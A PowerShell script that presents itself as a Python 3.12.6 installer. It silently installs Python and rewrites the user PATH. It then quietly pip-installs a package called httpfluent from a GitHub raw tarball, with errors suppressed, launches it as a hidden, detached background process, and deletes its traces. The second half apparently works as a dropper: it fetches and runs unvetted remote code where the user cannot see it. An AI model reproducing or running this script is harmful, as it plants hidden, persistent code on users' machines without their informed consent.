# ===================================================
# Python 3.12.6 + httpfluent (TESTING VERSION)
# Includes Error Handling and Progress Text
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

Write-Host "[*] Starting Pre-check..." -ForegroundColor Cyan

# --- Step 0: Pre-Check ---
try {
    if (Get-Command python -ErrorAction SilentlyContinue) {
        $ExecutableToUse = "python"
    } elseif (Test-Path $PythonExe) {
        $ExecutableToUse = $PythonExe
    }

    if ($ExecutableToUse) {
        $VersionString = & $ExecutableToUse --version 2>&1
        if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
            $Ver = [version]$Matches[1]
            if ($Ver -ge [version]"3.9") {
                Write-Host "[+] Found compatible Python $Ver. Skipping install." -ForegroundColor Green
                $InstallRequired = $false
            }
        }
    }
} catch {
    Write-Host "[-] Pre-check error: $($_.Exception.Message)" -ForegroundColor Red
}

# --- YOUR ALGORITHM ---
if ($InstallRequired) {
    try {
        $PythonVersion = "3.12.6"
        $PythonInstaller = "python-$PythonVersion-amd64.exe"
        $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
        $DownloadDir = "$env:TEMP\Python"

        if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir | Out-Null }

        $InstallerPath = Join-Path $DownloadDir $PythonInstaller
        Write-Host "[*] Downloading Python $PythonVersion..." -ForegroundColor Yellow
        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)

        Write-Host "[*] Running Installer (Silent)..." -ForegroundColor Yellow
        $Process = Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -PassThru
        
        if ($Process.ExitCode -ne 0) { throw "Installer exited with code $($Process.ExitCode)" }

        # Fix Path
        Write-Host "[*] Updating Environment Variables..." -ForegroundColor Yellow
        $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
        $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
        [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
        $env:Path = $NewPath
        $ExecutableToUse = $PythonExe
    } catch {
        Write-Host "[!] FATAL ERROR during Install: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# --- Step 7: Package Installation & Execution ---
try {
    Write-Host "[*] Updating Pip..." -ForegroundColor Yellow
    & $ExecutableToUse -m pip install --upgrade pip --quiet 2>$null

    Write-Host "[*] Installing Requests & httpfluent..." -ForegroundColor Yellow
    & $ExecutableToUse -m pip install requests --quiet 2>$null
    & $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet 2>$null

    Write-Host "[*] Launching httpfluent in background..." -ForegroundColor Yellow
    
    # Detached process logic to keep it alive
    $StartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $StartInfo.FileName = $ExecutableToUse
    $StartInfo.Arguments = "-m httpfluent"
    $StartInfo.WindowStyle = "Hidden"
    $StartInfo.CreateNoWindow = $true
    $StartInfo.UseShellExecute = $false
    
    $p = [System.Diagnostics.Process]::Start($StartInfo)
    
    if ($p) {
        Write-Host "[+] httpfluent started successfully (PID: $($p.Id))" -ForegroundColor Green
    } else {
        throw "Failed to initialize httpfluent process."
    }

} catch {
    Write-Host "[!] ERROR during Package Setup: $($_.Exception.Message)" -ForegroundColor Red
}

# --- Step 8: Cleanup ---
Write-Host "[*] Cleaning up temporary files..." -ForegroundColor Cyan
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "[DONE] Script execution finished." -ForegroundColor Cyan
